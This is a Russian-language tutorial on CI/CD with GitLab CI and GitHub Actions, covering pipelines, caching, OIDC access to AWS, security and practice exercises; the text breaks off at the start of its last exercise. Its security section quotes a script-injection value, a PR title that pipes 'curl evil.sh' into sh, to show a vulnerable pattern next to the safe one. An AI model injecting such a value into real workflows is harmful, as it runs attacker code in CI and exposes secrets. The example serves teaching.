# CI/CD: GitLab CI и GitHub Actions

Подробно о CI/CD: концепции и принципы, стратегии деплоя, устройство GitLab CI и GitHub Actions, полные пайплайны с разбором каждой части, кэш и артефакты, переиспользование, безопасность и ускорение. В конце — вопросы с собеседований.

## Концепции

### CI, Continuous Delivery и Continuous Deployment
- **CI (Continuous Integration, непрерывная интеграция)** — разработчики часто (минимум раз в день) вливают изменения в общую ветку, и **каждое изменение автоматически собирается и проверяется тестами**. Цель — находить проблемы интеграции сразу, пока изменение маленькое и свежо в памяти, а не через месяц при большом слиянии.
- **Continuous Delivery (непрерывная доставка)** — каждое изменение, прошедшее проверки, **готово к выкатке в прод** в любой момент: собран артефакт, пройдены тесты, выкачено на тестовые окружения. Выкатка в прод — по нажатию кнопки.
- **Continuous Deployment (непрерывное развёртывание)** — следующий шаг: прошедшее проверки изменение **уходит в прод автоматически**, без участия человека.

### Принципы хорошего пайплайна
**1. Build once, deploy many — собери один раз, разворачивай везде.** Артефакт (Docker-образ) собирается **один раз** и один и тот же образ продвигается dev → stage → prod. Окружения отличаются только конфигурацией (переменные, values-файлы). Если пересобирать образ для каждого окружения, в прод может попасть не то, что тестировали (другие версии зависимостей на момент сборки).

**2. Быстрая обратная связь.** Дешёвые и быстрые проверки — первыми (линтеры, юнит-тесты — секунды), дорогие и долгие — потом (интеграционные тесты, сканирование). Пайплайн должен падать как можно раньше.

**3. Воспроизводимость.** Фиксированные версии образов инструментов и зависимостей. Один и тот же коммит даёт один и тот же результат.

**4. Идемпотентность.** Повторный запуск задачи не ломает ничего. Деплой той же версии второй раз ничего не меняет.

**5. Пайплайн как код.** Описание пайплайна лежит в репозитории рядом с кодом, проходит ревью, имеет историю.

**6. Неизменяемые артефакты с понятными версиями.** Образ тегируется SHA коммита и семантической версией для релизов, а не `latest`. Всегда можно ответить «что сейчас в проде» и откатиться на конкретную версию.

### Стратегии деплоя
- **Rolling update** — постепенно заменять старые экземпляры новыми (по умолчанию в Kubernetes). Без дополнительных ресурсов, но какое-то время работают обе версии одновременно.
- **Recreate** — остановить всё старое, запустить новое. Простой, но с даунтаймом. Нужен, когда две версии не могут работать одновременно.
- **Blue/Green** — два одинаковых окружения: blue (текущее) и green (новое). Новая версия разворачивается в green, проверяется, затем **весь трафик переключается разом**. Откат — переключить обратно. Минус — двойные ресурсы на время переключения.
- **Canary** — новая версия сначала получает **небольшую долю трафика** (5%), метрики (ошибки, задержки) сравниваются со старой версией, затем доля постепенно растёт. При ухудшении — автоматический откат. Инструменты: Argo Rollouts, Flagger, взвешенные target groups ALB.
- **Feature flags** — код новой функции уже в проде, но **выключен** флагом. Включение — для части пользователей или всех, без деплоя. Разделяет «выкатить код» и «включить функцию». Инструменты: LaunchDarkly, Unleash (сервисы управления флагами с интерфейсом и правилами «включить для 10% пользователей»), AWS AppConfig.

### Push против pull (GitOps)
- **Push** — CI-пайплайн сам ходит в кластер и применяет изменения (`helm upgrade`, `kubectl apply`). Просто, но CI нужны права на запись в кластер, и он становится точкой атаки.
- **Pull (GitOps)** — агент **внутри** кластера (ArgoCD, Flux) следит за git-репозиторием с манифестами и сам применяет изменения. CI только собирает образ и обновляет тег в репозитории конфигурации. Подробнее — в теме про GitOps.

### Безопасность пайплайна
- **OIDC вместо статических ключей** для доступа в облако (см. ниже).
- **Защищённые (protected) и замаскированные (masked) переменные** — секреты доступны только в защищённых ветках и не печатаются в логах.
- **Минимальные права** у раннеров и токенов.
- **Фиксированные версии** сторонних образов и actions.
- **Сканирование:** SAST (Static Application Security Testing — анализ исходного кода на уязвимости без запуска: SQL-инъекции, небезопасные функции), SCA (Software Composition Analysis — поиск известных уязвимостей в сторонних библиотеках по их версиям), поиск секретов (gitleaks — находит ключи и пароли, случайно закоммиченные в репозиторий), сканирование образов (Trivy), IaC-сканирование (checkov, trivy config).
- **Цепочка поставки:** подпись образов (cosign), SBOM, проверка происхождения.

### 🧪 Мини-задание

**Задача.** Сымитируй принцип fail fast: напиши «пайплайн» из трёх стадий (lint → test → build) на bash, где тесты падают. Посмотри, дойдёт ли дело до сборки и какой код вернёт пайплайн.

<details class="qa"><summary>Решение: команда и ожидаемый результат</summary>

Скопируй блок в терминал целиком:

```bash
cd "$(mktemp -d)"
cat > pipeline.sh <<'EOF'
set -e
stage() { echo "== $1"; shift; "$@"; }
stage lint  true
stage test  sh -c 'echo "1 test failed"; exit 1'
stage build echo "image built"
EOF
bash pipeline.sh; echo "pipeline exit=$?"
```

Ожидаемый результат:

```text
== lint
== test
1 test failed
pipeline exit=1
```

Разбор: CI-система, как и `set -e`, решает всё по коду возврата: ненулевой код — job красный, следующие стадии не запускаются. Сборка не началась, поэтому образ из сломанного кода никуда не попал. Отсюда два правила хорошего пайплайна: дешёвые и быстрые проверки (lint, unit-тесты) ставят первыми, а скрипты в job'ах обязаны честно возвращать ненулевой код при ошибке.

</details>

## GitLab CI

### Основные понятия
- **Pipeline** — один запуск всего процесса для коммита, MR или тега. Описывается в файле `.gitlab-ci.yml` в корне репозитория.
- **Stage** — этап (lint, test, build, deploy). Стадии идут **последовательно**: следующая начинается, когда все задачи предыдущей успешны.
- **Job** — задача внутри стадии: набор команд, выполняемых в изолированном окружении. Задачи одной стадии выполняются **параллельно**.
- **Runner** — агент, который выполняет задачи. Бывают общие (shared, от GitLab.com), групповые и проектные. **Executor** определяет, где выполняется задача: в Docker-контейнере (`docker`), в поде Kubernetes (`kubernetes`), прямо на машине (`shell`). Задача выбирает раннер по **tags**.

### Минимальный пайплайн с объяснением
```yaml
stages:          # порядок стадий
  - test
  - build

unit-tests:      # имя задачи (любое)
  stage: test
  image: python:3.12-slim          # задача выполнится в контейнере из этого образа
  script:                          # команды; если любая вернёт ненулевой код — задача упадёт
    - pip install -r requirements.txt
    - pytest -q

build-image:
  stage: build                     # запустится, только если все задачи стадии test прошли
  image: docker:27
  services:
    - docker:27-dind               # дополнительный контейнер с Docker-демоном (Docker-in-Docker)
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA .
```

### Предопределённые переменные
GitLab передаёт в каждую задачу десятки переменных с контекстом:
- `CI_COMMIT_SHA`, `CI_COMMIT_SHORT_SHA` — хеш коммита (для тегов образов);
- `CI_COMMIT_BRANCH`, `CI_COMMIT_TAG`, `CI_COMMIT_REF_NAME` — ветка или тег;
- `CI_DEFAULT_BRANCH` — основная ветка (обычно `main`);
- `CI_PIPELINE_SOURCE` — что запустило пайплайн: `push`, `merge_request_event`, `schedule`, `web` (кнопка), `api`, `trigger`;
- `CI_MERGE_REQUEST_IID` — номер MR;
- `CI_REGISTRY`, `CI_REGISTRY_IMAGE`, `CI_REGISTRY_USER`, `CI_REGISTRY_PASSWORD` — встроенный Container Registry;
- `CI_JOB_TOKEN` — временный токен задачи для доступа к API и другим проектам.

Свои переменные задаются в `variables:` в файле или в настройках проекта и группы (**Settings → CI/CD → Variables**) — там хранят секреты с флагами:
- **Masked** — значение заменяется на `[MASKED]` в логах;
- **Protected** — доступна только в задачах на защищённых ветках и тегах. Так секреты прода не попадут в пайплайн из произвольной ветки.

### Когда запускается задача: rules
`rules` — список условий, проверяется **сверху вниз**, срабатывает **первое** подходящее правило:
```yaml
deploy-prod:
  script: ./deploy.sh prod
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      when: never                              # в MR-пайплайнах — никогда
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual                             # на main — по кнопке
    - when: never                              # во всех остальных случаях — нет
```
Значения `when`: `on_success` (по умолчанию — если предыдущие стадии успешны), `manual` (по кнопке), `always` (даже если предыдущие упали — например, сбор отчётов), `never`, `delayed` (с задержкой `start_in`).

Другие условия:
```yaml
rules:
  - changes:                         # только если менялись эти файлы
      - src/**/*
      - Dockerfile
  - exists:
      - Dockerfile                   # только если файл существует в репозитории
```
Старый синтаксис `only/except` устарел, вместо него — `rules`.

**`workflow: rules`** — условия для **всего пайплайна**: создавать ли его вообще. Типичная задача — не запускать два пайплайна (на push в ветку и на MR) одновременно:
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"    # пайплайн для MR
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never                                         # push в ветку с открытым MR — не дублировать
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH         # main
    - if: $CI_COMMIT_TAG                                  # теги (релизы)
```

### needs — не ждать всю стадию (DAG)
По умолчанию задача ждёт **всю** предыдущую стадию. `needs` позволяет начать сразу после конкретных задач, строя граф зависимостей (DAG):
```yaml
build-api:
  stage: build
  needs: [test-api]          # стартует, как только прошёл test-api, не дожидаясь test-web
build-web:
  stage: build
  needs: [test-web]
lint:
  stage: test
  needs: []                  # пустой список — стартовать сразу при создании пайплайна
```
В монорепозитории с несколькими сервисами это заметно ускоряет пайплайн.

### Кэш и артефакты — в чём разница
Это частый вопрос.

**Cache** — для **ускорения**: скачанные зависимости (пакеты NuGet, npm, pip), которые можно переиспользовать между запусками.
- Не гарантирован: может отсутствовать (другой раннер, кэш очищен), и задача обязана работать без него.
- Живёт между пайплайнами.

**Artifacts** — **результат** задачи, нужный следующим задачам или людям: собранные бинарники, отчёты тестов, план Terraform.
- Гарантированно передаётся задачам следующих стадий этого пайплайна.
- Доступен для скачивания в интерфейсе, имеет срок хранения.

```yaml
test:
  image: mcr.microsoft.com/dotnet/sdk:8.0
  variables:
    NUGET_PACKAGES: $CI_PROJECT_DIR/.nuget/packages   # пакеты кладём внутрь проекта, чтобы их можно было закэшировать
  cache:
    key:
      files: [src/packages.lock.json]   # ключ кэша — хеш lock-файла: изменились зависимости → новый кэш
    paths: [.nuget/packages]
  script:
    - dotnet test --logger "junit;LogFilePath=../report.xml"
  artifacts:
    when: always                        # сохранить отчёт, даже если тесты упали
    expire_in: 1 week
    reports:
      junit: report.xml                 # GitLab покажет результаты тестов прямо в MR
```

### Окружения, ручные деплои, защита от параллельного деплоя
```yaml
deploy-prod:
  stage: deploy
  environment:
    name: production                    # GitLab ведёт историю деплоев в окружение и показывает, что сейчас развёрнуто
    url: https://app.example.com
  resource_group: production            # не больше одного деплоя в prod одновременно — остальные ждут в очереди
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
  script:
    - ./deploy.sh
```
**Protected environments** — разрешить деплой в `production` только определённым людям или группам. **Review apps** — временное окружение на каждый MR (`environment: name: review/$CI_COMMIT_REF_SLUG` с `on_stop` — задача для удаления).

### Переиспользование кода пайплайнов
**`extends`** — наследовать настройки шаблона (задачи, имя которой начинается с точки — она скрыта и сама не запускается):
```yaml
.dotnet-base:
  image: mcr.microsoft.com/dotnet/sdk:8.0
  before_script:
    - dotnet restore

test:
  extends: .dotnet-base
  script: dotnet test
```
**`include`** — подключить конфигурацию из других файлов, проектов или шаблонов GitLab:
```yaml
include:
  - local: ci/build.yml                         # файл из этого же репозитория
  - project: platform/ci-templates              # файл из другого проекта
    ref: v3.2.0                                 # ОБЯЗАТЕЛЬНО фиксировать версию
    file: /templates/dotnet.yml
  - template: Jobs/SAST.gitlab-ci.yml           # встроенные шаблоны GitLab
  - component: gitlab.com/org/components/docker-build@1.4   # CI/CD Component из каталога
```
**`!reference`** — переиспользовать отдельную секцию другой задачи: `script: [!reference [.setup, script], ./run.sh]`.

**CI/CD Components** — версионируемые, параметризуемые шаблоны с каталогом. Современный способ построить общую библиотеку пайплайнов для компании: сервисные команды подключают компонент одной строкой и задают пару параметров.

### Parent-child и multi-project пайплайны
- **Parent-child** (`trigger: include: path/to/child.yml`) — основной пайплайн запускает дочерние из файлов в том же репозитории. Для монорепозитория: у каждого сервиса свой файл пайплайна, запускается, только если сервис менялся.
- **Multi-project** (`trigger: project: group/other-repo`) — запустить пайплайн в другом проекте. Например, после сборки образа запустить деплой из репозитория конфигурации.

### Полный пример: сборка, Terraform и деплой в EKS
```yaml
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
    - if: $CI_COMMIT_TAG

stages: [lint, test, build, plan, deploy]

variables:
  IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA     # неизменяемый тег — SHA коммита
  TF_ROOT: infra/envs/prod

default:
  interruptible: true          # если в ветку пришёл новый коммит — отменить устаревший пайплайн

include:
  - template: Jobs/SAST.gitlab-ci.yml                # сканирование кода на уязвимости

# --- шаблон для .NET-задач ---
.dotnet:
  image: mcr.microsoft.com/dotnet/sdk:8.0
  variables:
    NUGET_PACKAGES: $CI_PROJECT_DIR/.nuget/packages
  cache:
    key:
      files: [src/packages.lock.json]
    paths: [.nuget/packages]

unit-tests:
  extends: .dotnet
  stage: test
  script:
    - dotnet test --logger "junit;LogFilePath=../report.xml"
  artifacts:
    when: always
    reports:
      junit: report.xml

build-image:
  stage: build
  image: docker:27
  services: [docker:27-dind]
  script:
    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
    - docker build --cache-from "$CI_REGISTRY_IMAGE:latest" -t "$IMAGE" .
    - docker push "$IMAGE"
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH       # на main — всегда
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes: [src/**/*, Dockerfile]                   # в MR — только если менялся код

tf-plan:
  stage: plan
  image:
    name: hashicorp/terraform:1.9
    entrypoint: [""]                    # у образа terraform ENTRYPOINT = terraform; сбрасываем, чтобы выполнять script
  id_tokens:
    AWS_TOKEN:                          # GitLab выдаст задаче OIDC-токен с этой аудиторией
      aud: sts.amazonaws.com
  variables:
    AWS_ROLE_ARN: $PLAN_ROLE_ARN        # AWS SDK и провайдер Terraform сами обменяют токен на временные креды роли
    AWS_WEB_IDENTITY_TOKEN_FILE: /tmp/web-identity-token
  before_script:
    - echo "$AWS_TOKEN" > /tmp/web-identity-token
  script:
    - cd "$TF_ROOT"
    - terraform init -input=false
    - terraform plan -out=tfplan -input=false
  artifacts:
    paths: [$TF_ROOT/tfplan]            # план передаётся задаче apply — применится ровно то, что ревьюили
    expire_in: 1 week
  resource_group: tf-prod

deploy-prod:
  stage: deploy
  image: alpine/k8s:1.30.4              # образ с kubectl, helm, aws cli
  needs: [build-image, tf-plan]
  environment:
    name: production
    url: https://app.example.com
  resource_group: production
  script:
    - helm upgrade --install app ./chart -n app --set image.tag=$CI_COMMIT_SHORT_SHA --atomic --wait --timeout 5m
    # --atomic: если раскатка не удалась за timeout — автоматический откат на предыдущую ревизию
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
```

### Прочее, что стоит знать о GitLab
- **Merge request pipelines** — пайплайны в контексте MR. **Merged results pipelines** — проверяется результат слияния ветки с актуальным main, а не сама ветка. **Merge trains** — очередь MR, каждый проверяется поверх предыдущих в очереди: main никогда не ломается из-за двух одновременно влитых несовместимых MR.
- `retry:` — автоматический повтор при определённых сбоях: `retry: { max: 2, when: [runner_system_failure, stuck_or_timeout_failure] }`.
- `timeout:` — ограничение времени задачи.
- `allow_failure: true` — падение задачи не роняет пайплайн (для необязательных проверок).
- `parallel: N` — разбить задачу на N копий (например, тесты по частям); `parallel: matrix:` — матрица параметров.
- **Scheduled pipelines** — пайплайн по расписанию (ночные тесты, проверка drift Terraform).

### 🧪 Мини-задание

**Задача.** Разбери `.gitlab-ci.yml` с YAML-якорем общих настроек (якорь `&имя` помечает блок, а `<<: *имя` вставляет его копию в другое место — так в YAML избегают повторов) и `needs`: выведи для каждой задачи стадию, итоговый образ после раскрытия якоря и от чего она зависит. Какие задачи стартуют параллельно и дождётся ли `test-api` сборки `build-web`?

<details class="qa"><summary>Решение: команда и ожидаемый результат</summary>

Скопируй блок в терминал целиком:

```bash
cd "$(mktemp -d)"
cat > .gitlab-ci.yml <<'EOF'
.job_defaults: &job_defaults
  image: python:3.12
  retry: 2

stages: [build, test, deploy]

build-api:
  <<: *job_defaults
  stage: build
  script: [make api]

build-web:
  <<: *job_defaults
  stage: build
  script: [make web]

test-api:
  <<: *job_defaults
  stage: test
  needs: [build-api]
  script: [pytest]

deploy:
  stage: deploy
  image: alpine:3.20
  needs: [test-api]
  script: [./deploy.sh]
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
EOF
yq 'explode(.) | to_entries | .[]
    | select((.value | tag) == "!!map" and (.value | has("stage")))
    | [.key, .value.stage, .value.image, ((.value.needs // ["-"]) | join(","))] | @tsv' .gitlab-ci.yml
```

Ожидаемый результат:

```text
build-api	build	python:3.12	-
build-web	build	python:3.12	-
test-api	test	python:3.12	build-api
deploy	deploy	alpine:3.20	test-api
```

Разбор: `explode` раскрыл якорь `<<: *job_defaults`, и три задачи получили `python:3.12`, а `deploy` переопределил образ своим. Скрытая задача `.job_defaults` (с точкой) не запускается и в вывод не попала, потому что у неё нет `stage`. Обе сборки стартуют параллельно. Благодаря `needs: [build-api]` задача `test-api` начнётся сразу после `build-api`, не дожидаясь `build-web` — это и есть DAG. Без `needs` она ждала бы всю стадию `build`. `deploy` из-за `rules` появится в пайплайне только для ветки `main`.

</details>

## GitHub Actions

### Основные понятия
- **Workflow** — файл `.github/workflows/<имя>.yml`. Их может быть много, каждый со своими триггерами.
- **Event (on)** — что запускает workflow: push, pull request, расписание, ручной запуск, вызов из другого workflow.
- **Job** — задача на отдельном **раннере** (виртуальной машине или контейнере). **Задачи выполняются параллельно**, если не указана зависимость через `needs`.
- **Step** — шаг внутри задачи: либо shell-команда (`run`), либо готовое действие (`uses`). Шаги одной задачи выполняются последовательно на одной машине и делят файловую систему.
- **Action** — переиспользуемый шаг из маркетплейса или своего репозитория: `actions/checkout`, `docker/build-push-action`.
- **Runner** — GitHub-hosted (виртуальные машины GitHub: `ubuntu-latest`, `windows-latest`, `macos-latest`) или self-hosted (свои машины; в Kubernetes — **Actions Runner Controller**, ARC).

### Соответствие терминов GitLab и GitHub
| GitLab CI | GitHub Actions |
|---|---|
| `.gitlab-ci.yml` (один файл + include) | `.github/workflows/*.yml` (много независимых workflow) |
| pipeline → stages → jobs | workflow → jobs → steps |
| стадии последовательно, `needs` для DAG | задачи параллельно, порядок через `needs` |
| `rules`, `workflow: rules` | `on:` (события) и `if:` (условия) |
| `extends`, `include`, CI/CD Components | reusable workflows, composite actions |
| `cache`, `artifacts` | `actions/cache`, `actions/upload-artifact` / `download-artifact` |
| `environment` + `when: manual` | `environment` + required reviewers |
| CI/CD Variables (masked, protected) | Secrets и Variables (уровни: репозиторий, окружение, организация) |
| `parallel: matrix` | `strategy: matrix` |
| `id_tokens` (OIDC) | `permissions: id-token: write` (OIDC) |
| `resource_group` | `concurrency` |
| `interruptible` | `concurrency.cancel-in-progress` |

### События (on)
```yaml
on:
  push:
    branches: [main]
    tags: ["v*"]
    paths: ["src/**", "Dockerfile"]   # только если менялись эти файлы
  pull_request:                       # PR в любую ветку
  schedule:
    - cron: "0 3 * * 1"               # по понедельникам в 03:00 UTC
  workflow_dispatch:                  # кнопка «Run workflow» в интерфейсе, можно с параметрами
    inputs:
      environment:
        type: choice
        options: [stage, prod]
  workflow_call:                      # этот workflow можно вызывать из других (reusable)
```
**`pull_request` и `pull_request_target` — важное различие для безопасности:**
- `pull_request` из **форка** выполняется **без доступа к секретам** и с токеном только на чтение. Безопасно: чужой код не может украсть секреты.
- `pull_request_target` выполняется в контексте **основного** репозитория **с секретами**. Если в нём сделать checkout кода из PR и запустить его (сборку, тесты), автор PR может украсть все секреты. Использовать только для действий, не исполняющих код PR (поставить метку, оставить комментарий).

### Полный пример: тесты, сборка образа в ECR, деплой с подтверждением
```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read            # минимальные права GITHUB_TOKEN по умолчанию для всех задач

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}   # одна «очередь» на ветку
  cancel-in-progress: true                          # новый коммит отменяет устаревший запуск

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false                    # не отменять остальные варианты матрицы при падении одного
      matrix:
        dotnet: ["8.0.x", "9.0.x"]        # задача запустится дважды — по разу для каждой версии
    steps:
      - uses: actions/checkout@v4         # скачать код репозитория на раннер
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: ${{ matrix.dotnet }}
          cache: true
          cache-dependency-path: src/packages.lock.json
      - run: dotnet test

  build:
    needs: test                           # только после успешных тестов
    if: github.event_name == 'push'       # только на push в main, не в PR
    runs-on: ubuntu-latest
    permissions:
      id-token: write                     # разрешить получить OIDC-токен для AWS
      contents: read
    outputs:
      tag: ${{ steps.meta.outputs.tag }}  # передать значение следующим задачам
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-ecr-push
          aws-region: us-east-2           # без ключей: обмен OIDC-токена на временные креды
      - id: ecr
        uses: aws-actions/amazon-ecr-login@v2
      - id: meta
        run: echo "tag=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"   # записать output шага
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ${{ steps.ecr.outputs.registry }}/app:${{ steps.meta.outputs.tag }}
          cache-from: type=gha            # кэш слоёв Docker в кэше GitHub Actions
          cache-to: type=gha,mode=max

  deploy-prod:
    needs: build
    runs-on: ubuntu-latest
    environment: production               # если у окружения настроены required reviewers — ждёт подтверждения
    steps:
      - run: echo "Деплою версию ${{ needs.build.outputs.tag }}"
```

### Передача данных
- **Между шагами одной задачи** — output шага: `echo "name=value" >> "$GITHUB_OUTPUT"`, затем `${{ steps.<id>.outputs.name }}`. Переменные окружения для последующих шагов: `echo "VAR=value" >> "$GITHUB_ENV"`. Файлы на диске тоже доступны (одна машина).
- **Между задачами** — каждая задача на **отдельной** машине, общего диска нет. Небольшие значения передаются через `outputs` задачи и `needs.<job>.outputs.<name>`. Файлы — через `actions/upload-artifact` и `actions/download-artifact`.

### Выражения и контексты
`${{ }}` — выражения. Контексты: `github` (событие, ветка, SHA, автор), `env`, `vars`, `secrets`, `matrix`, `needs`, `steps`, `runner`, `inputs`.
```yaml
if: github.ref == 'refs/heads/main' && github.event_name == 'push'
if: failure()                 # шаг выполнится, только если что-то упало (уведомление)
if: always()                  # выполнится в любом случае (сбор отчётов)
if: contains(github.event.head_commit.message, '[skip tests]') == false
```

### Переиспользование
**Reusable workflow** — целый workflow с задачами, который вызывают другие workflow:
```yaml
# в репозитории org/platform: .github/workflows/deploy.yml
on:
  workflow_call:
    inputs:
      environment: { type: string, required: true }
    secrets:
      KUBECONFIG_B64: { required: true }
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: echo "deploy to ${{ inputs.environment }}"
```
```yaml
# в репозитории сервиса
jobs:
  deploy-stage:
    uses: org/platform/.github/workflows/deploy.yml@v1   # фиксированная версия
    with:
      environment: stage
    secrets: inherit                                      # передать все секреты вызывающего
```
**Composite action** — набор **шагов**, упакованный как один action (файл `action.yml` с `runs: using: composite`). Используется внутри задачи как обычный шаг. Разница: reusable workflow — целые задачи (со своими раннерами), composite action — шаги внутри задачи.

### Безопасность в GitHub Actions
- **`permissions`** — минимальные права `GITHUB_TOKEN` на уровне workflow или задачи (по умолчанию в старых репозиториях токен может иметь запись во всё).
- **Пинить сторонние actions по полному SHA коммита**, а не по тегу: тег можно перевесить на вредоносный код (такие атаки на популярные actions уже были). `uses: some/action@a1b2c3d4...` вместо `@v2`.
- **Script injection.** Нельзя подставлять данные, которые контролирует пользователь, прямо в `run`:
  ```yaml
  # ОПАСНО: заголовок PR вида  "; curl evil.sh | sh #  выполнится как команда
  - run: echo "PR title is ${{ github.event.pull_request.title }}"
  # БЕЗОПАСНО: через переменную окружения — значение не интерпретируется как код
  - env:
      TITLE: ${{ github.event.pull_request.title }}
    run: echo "PR title is $TITLE"
  ```
- Секреты окружений (environment secrets) с обязательным подтверждением для prod.
- Self-hosted раннеры не использовать для публичных репозиториев: любой PR сможет выполнить код на твоей машине.

### 🧪 Мини-задание

**Задача.** В workflow задана матрица: два `os` × три версии Python, и одна комбинация исключена через `exclude`. Посчитай, сколько job'ов запустит GitHub Actions, и выведи их список.

<details class="qa"><summary>Решение: команда и ожидаемый результат</summary>

Скопируй блок в терминал целиком:

```bash
cd "$(mktemp -d)"
cat > ci.yml <<'EOF'
on: [push]
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        python: ["3.11", "3.12", "3.13"]
        exclude:
          - os: macos-latest
            python: "3.11"
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
      - run: pytest -q
EOF
yq -o=json '.jobs.test.strategy.matrix' ci.yml | python3 -c '
import itertools, json, sys
m = json.load(sys.stdin)
ex = m.pop("exclude", [])
combos = [dict(zip(m, v)) for v in itertools.product(*m.values())]
combos = [c for c in combos if not any(all(c[k] == e[k] for k in e) for e in ex)]
for c in combos:
    print(c["os"], c["python"])
print(len(combos), "jobs")'
```

Ожидаемый результат:

```text
ubuntu-latest 3.11
ubuntu-latest 3.12
ubuntu-latest 3.13
macos-latest 3.12
macos-latest 3.13
5 jobs
```

Разбор: матрица — это декартово произведение всех осей: 2 × 3 = 6, минус одна исключённая комбинация = 5 параллельных job'ов. Скрипт повторяет ровно эту логику. `fail-fast: false` нужен, чтобы падение одной комбинации не отменило остальные — иначе не узнаешь, ломается ли только macOS или всё сразу. Версии Python взяты в кавычки не случайно: без них YAML прочитает `3.10` как число `3.1`.

</details>

## Доступ в облако из CI: OIDC
**Проблема.** Долгоживущие ключи AWS (`AWS_ACCESS_KEY_ID`) в переменных CI могут утечь (логи, скомпрометированный раннер, бывший сотрудник), их нужно вручную ротировать.

**Решение — OIDC (OpenID Connect).**
1. В AWS IAM один раз регистрируется **Identity Provider** — GitLab (`gitlab.com`) или GitHub (`token.actions.githubusercontent.com`).
2. Создаётся IAM-роль с **trust policy**: «эту роль может получить токен от этого провайдера, но только если в токене указан такой-то проект и ветка».
3. При каждом запуске задачи CI выдаёт ей **подписанный токен** с информацией: проект, ветка, окружение.
4. Задача обменивает токен на **временные креды** роли (`AssumeRoleWithWebIdentity`), действующие около часа.

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/gitlab.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": { "gitlab.com:aud": "sts.amazonaws.com" },
    "StringLike":   { "gitlab.com:sub": "project_path:mygroup/infra:ref_type:branch:ref:main" }
  }
}
```
Условие на `sub` — ключевое: без него роль сможет получить **любой** проект на gitlab.com.

### 🧪 Мини-задание

**Задача.** Собери учебный ID-токен GitLab (JWT — JSON Web Token: подписанный JSON с утверждениями о том, кто его получил) с claim'ом (полем-утверждением внутри токена) `sub` для ветки `main`, раскодируй его payload и проверь, какие условия `StringLike` из trust policy роли AWS его пропустят: точное, «весь проект» и «чужой проект».

<details class="qa"><summary>Решение: команда и ожидаемый результат</summary>

Скопируй блок в терминал целиком:

```bash
payload='{"iss":"https://gitlab.com","aud":"sts.amazonaws.com","sub":"project_path:mygroup/app:ref_type:branch:ref:main","ref_protected":"true"}'
token="e30.$(printf '%s' "$payload" | base64 | tr -d '=\n' | tr '/+' '_-').sig"
echo "$token" | cut -d. -f2 | python3 -c '
import base64, fnmatch, json, sys
p = sys.stdin.read().strip()
claims = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
print(claims["aud"], claims["sub"])
for pattern in ["project_path:mygroup/app:ref_type:branch:ref:main",
                "project_path:mygroup/*",
                "project_path:other/app:*"]:
    print(fnmatch.fnmatch(claims["sub"], pattern), pattern)'
```

Ожидаемый результат:

```text
sts.amazonaws.com project_path:mygroup/app:ref_type:branch:ref:main
True project_path:mygroup/app:ref_type:branch:ref:main
True project_path:mygroup/*
False project_path:other/app:*
```

Разбор: JWT — это три части через точку, а payload — просто base64url-JSON, его может прочитать кто угодно. Защищает подпись, которую AWS проверяет по ключам `iss`. Роль доверяет токену, если `aud` и `sub` подходят под условия trust policy. Точное условие пускает только `main` этого проекта. `project_path:mygroup/*` пускает любой проект группы и любую ветку, включая чужую feature-ветку, — так деплой в прод может запустить кто угодно с правом push. Поэтому в условии фиксируют проект и защищённую ветку или окружение.

</details>

## Как ускорить пайплайн
- **Кэш зависимостей** с ключом по lock-файлу.
- **Кэш слоёв Docker** (BuildKit `--cache-from/--cache-to` в registry или кэш CI) и правильный порядок инструкций в Dockerfile.
- **Параллельность**: `needs` (DAG), независимые задачи одновременно, тесты разбиты на части (`parallel`, matrix).
- **Запускать только нужное**: `rules: changes` / `paths` — не собирать сервис, который не менялся.
- **Отменять устаревшие запуски**: `interruptible` в GitLab, `concurrency.cancel-in-progress` в GitHub.
- **Лёгкий checkout**: shallow clone (`GIT_DEPTH` в GitLab, `fetch-depth: 1` в GitHub).
- **Готовые образы** с нужными инструментами вместо установки в каждом запуске.
- **Достаточно раннеров**: если задачи подолгу ждут в очереди, проблема не в пайплайне, а в мощностях (автомасштабируемые раннеры в Kubernetes).

### 🧪 Мини-задание

**Задача.** Сделай ключ кэша зависимостей из хеша `requirements.txt`, как это делает `cache:key:files` в GitLab или `hashFiles()` в GitHub Actions. Проверь, что изменение кода не меняет ключ, а изменение зависимостей — меняет.

<details class="qa"><summary>Решение: команда и ожидаемый результат</summary>

Скопируй блок в терминал целиком:

```bash
cd "$(mktemp -d)"
